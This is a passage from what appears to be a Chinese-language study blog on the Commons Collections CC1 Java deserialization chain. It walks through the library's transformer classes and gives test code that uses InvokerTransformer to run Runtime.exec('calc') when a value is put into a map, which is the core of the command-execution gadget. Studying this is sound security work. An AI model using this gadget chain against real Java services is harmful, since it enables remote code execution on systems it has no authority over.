class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Override to transform the value when using &lt;code&gt;setValue&lt;/code&gt;.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> value  the value to transform</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the transformed value</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> Commons Collections 3.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">    key = transformKey(key);</span><br><span class="line">    value = transformValue(value);</span><br><span class="line">    <span class="keyword">return</span> getMap().put(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>From p牛: keyTransformer是处理新元素的Key的回调，valueTransformer是处理新元素的value的回调。我们这⾥所说的”回调“，并不是传统意义上的⼀个回调函数，⽽是⼀个实现了Transformer接⼝的类</p></blockquote> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Factory method to create a transforming map.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * If there are any elements already in the map being decorated, they</span></span><br><span class="line"><span class="comment"> * are NOT transformed.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> keyTransformer  the transformer to use for key conversion, null means no conversion</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> valueTransformer  the transformer to use for value conversion, null means no conversion</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException if map is null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructor that wraps (not copies).</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * If there are any elements already in the collection being decorated, they</span></span><br><span class="line"><span class="comment"> * are NOT transformed.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> keyTransformer  the transformer to use for key conversion, null means no conversion</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> valueTransformer  the transformer to use for value conversion, null means no conversion</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException if map is null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>重点放在<code>transform()</code>函数上: 这里的<code>transform()</code>是调用的key和value的转换器的该方法</p><ol><li><code>transformKey()</code>: 对key调用<code>transform()</code>方法</li><li><code>transformValue()</code>: 对值调用<code>transform()</code>方法</li><li><code>transformMap()</code>: 对key和值都调用<code>transform()</code></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms a key.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The transformer itself may throw an exception if necessary.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> object  the object to transform</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> the transformed object</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformKey</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (keyTransformer == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> keyTransformer.transform(object);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms a value.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The transformer itself may throw an exception if necessary.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> object  the object to transform</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> the transformed object</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformValue</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (valueTransformer == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(object);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms a map.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The transformer itself may throw an exception if necessary.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map  the map to transform</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> the transformed object</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Map <span class="title function_">transformMap</span><span class="params">(Map map)</span> &#123;</span><br><span class="line">    <span class="type">Map</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedMap</span>(map.size());</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">Iterator</span> <span class="variable">it</span> <span class="operator">=</span> map.entrySet().iterator(); it.hasNext(); ) &#123;</span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) it.next();</span><br><span class="line">        result.put(transformKey(entry.getKey()), transformValue(entry.getValue()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><ol><li><p>根据注释，会返回一个新的常值转换器</p><ol><li>不会对输入的对象检查，最佳实践是做为常量对象的一个转换器工厂</li><li>iConstant是一个private final对象，<strong>赋值后无法进行修改</strong></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transformer implementation that returns the same constant each time.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * No check is made that the object is immutable. In general, only immutable</span></span><br><span class="line"><span class="comment"> * objects should use the constant factory. Mutable objects should</span></span><br><span class="line"><span class="comment"> * use the prototype factory.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> Commons Collections 3.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> $Revision: 1.5 $ $Date: 2004/05/16 11:36:31 $</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Stephen Colebourne</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>看看这里的tranform函数</p><ol><li>对于输入都返回一开始确定的那一个iConstant，这里是创建时的参数</li><li>如果传入想要获取的<code>ConstantToReturn</code>是null在构造函数时就会直接返回新的null对象</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms the input by ignoring it and returning the stored constant instead.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> input  the input object which is ignored</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the stored constant</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><ol><li><p>接口信息：会利用反射创建一个对象，每一个对象只包含一个函数可以通过反射进行调用 -&gt; 通过<code>transform(...)</code>进行触发</p><ol><li>特点<ol><li><p>其中有<code>paramTypes = (Class[]) paramTypes.clone()</code>和<code>args = (Object[]) args.clone();</code>经查阅<code>clone()</code>可以暂时理解为返回一个新的一摸一样的对象（防止对原始对象进行修改）</p>   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creates and returns a copy of this object.  The precise meaning</span></span><br><span class="line"><span class="comment"> * of &quot;copy&quot; may depend on the class of the object. The general</span></span><br><span class="line"><span class="comment"> * intent is that, for any object &#123;<span class="doctag">@code</span> x&#125;, the expression:</span></span><br><span class="line"><span class="comment"> * &lt;blockquote&gt;</span></span><br><span class="line"><span class="comment"> * &lt;pre&gt;</span></span><br><span class="line"><span class="comment"> * x.clone() != x&lt;/pre&gt;&lt;/blockquote&gt;</span></span><br><span class="line"><span class="comment"> * will be true, and that the expression:</span></span><br><span class="line"><span class="comment"> * &lt;blockquote&gt;</span></span><br><span class="line"><span class="comment"> * &lt;pre&gt;</span></span><br><span class="line"><span class="comment"> * x.clone().getClass() == x.getClass()&lt;/pre&gt;&lt;/blockquote&gt;</span></span><br><span class="line"><span class="comment"> * will be &#123;<span class="doctag">@code</span> true&#125;, but these are not absolute requirements.</span></span><br><span class="line"><span class="comment"> * While it is typically the case that:</span></span><br><span class="line"><span class="comment"> * &lt;blockquote&gt;</span></span><br><span class="line"><span class="comment"> * &lt;pre&gt;</span></span><br><span class="line"><span class="comment"> * x.clone().equals(x)&lt;/pre&gt;&lt;/blockquote&gt;</span></span><br><span class="line"><span class="comment"> * will be &#123;<span class="doctag">@code</span> true&#125;, this is not an absolute requirement.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure></li><li><p>提供了两个构造函数</p><ol><li><code>public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)</code></li><li><code>private InvokerTransformer(String methodName)</code>，拥有私有的构造函数，通过<code>getInstance()</code>获取对象实例</li></ol></li></ol></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transformer implementation that creates a new object instance by reflection.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> Commons Collections 3.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> $Revision: 1.7 $ $Date: 2004/05/26 21:44:05 $</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Stephen Colebourne</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>重点放在<code>transform</code>方法上：会对输入调用方法并返回作为输出</p><ol><li>可以见到在内部直接使用了<strong>反射</strong>，结合iMethodName和iParamTypes这两个内置参数</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms the input to result by invoking a method on the input.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> input  the input object to transform</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the transformed result, null if null input</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><ol><li><p>看看源码与注释：宏观上是将多个transformer子类对象连接在一起</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transformer implementation that chains the specified transformers together.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The input object is passed to the first transformer. The transformed result</span></span><br><span class="line"><span class="comment"> * is passed to the second transformer and so on.</span></span><br><span class="line"><span class="comment"> * 这里说明这是链式传递，可以理解为linux中的管道 |</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> Commons Collections 3.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> $Revision: 1.7 $ $Date: 2004/05/16 11:36:31 $</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Stephen Colebourne</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>重点来到<code>transform()</code>函数这里：对同一个对象(传入的)<strong>按顺序</strong>调用iTransformers数组中各个transformer的<code>transform(object)</code>函数</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms the input to result via each decorated transformer</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> object  the input object passed to the first transformer</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the transformed result</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);    <span class="comment">// 可以看到这里时反复利用，状态叠加</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="实现一下"><a href="#实现一下" class="headerlink" title="实现一下"></a>实现一下</h4><blockquote><p>再多的疑惑，实现一下就ok了</p></blockquote><ol><li>实现的逻辑是<ol><li>**转换触发点:**基于TransformedMap的<code>put()</code>方法会自动调用键值转换器的<code>transform()</code> –&gt; 如果是<code>setValue()</code>这里也可以</li><li>通过在键值转换器自定义&#x2F;选择，可以构造想要的调用</li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出关键</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printMap</span><span class="params">(Map map)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (Object entry: map.entrySet()) &#123;</span><br><span class="line">            System.out.println(((Map.Entry)entry).getKey());</span><br><span class="line">            System.out.println(((Map.Entry)entry).getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">transformedMapTest</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap,<span class="keyword">new</span> <span class="title class_">KeyTransformer</span>(), <span class="keyword">new</span> <span class="title class_">ValueTransformer</span>());</span><br><span class="line">        outerMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);    <span class="comment">// 说过在put()和setValue()处调用</span></span><br><span class="line">        printMap(innerMap);</span><br><span class="line">        printMap(outerMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">constantTransformerTest</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap,<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;hello world&quot;</span>));</span><br><span class="line">        outerMap.put(<span class="string">&quot;key1&quot;</span>,<span class="string">&quot;value1&quot;</span>);  <span class="comment">// 在put()的时候进行了修改存储的内容在outerMap中</span></span><br><span class="line">        outerMap.put(<span class="string">&quot;key2&quot;</span>,<span class="string">&quot;value2&quot;</span>);</span><br><span class="line">        printMap(innerMap);</span><br><span class="line">        printMap(outerMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">invokerTransformerTest</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap,<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;));</span><br><span class="line">        <span class="comment">// 这里的exec是Runtime.getRuntime()上调用的，可以去看看TransformedMap里的put()方法，Class[]是参数类型，Object[]是参数本身</span></span><br><span class="line">        outerMap.put(<span class="string">&quot;key1&quot;</span>,Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">chainedTransformerTest</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 这里也可以反过来调用</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap,<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;hello world&quot;</span>)&#125;));</span><br><span class="line">        outerMap.put(<span class="string">&quot;key1&quot;</span>,Runtime.getRuntime());</span><br><span class="line">        printMap(innerMap);</span><br><span class="line">        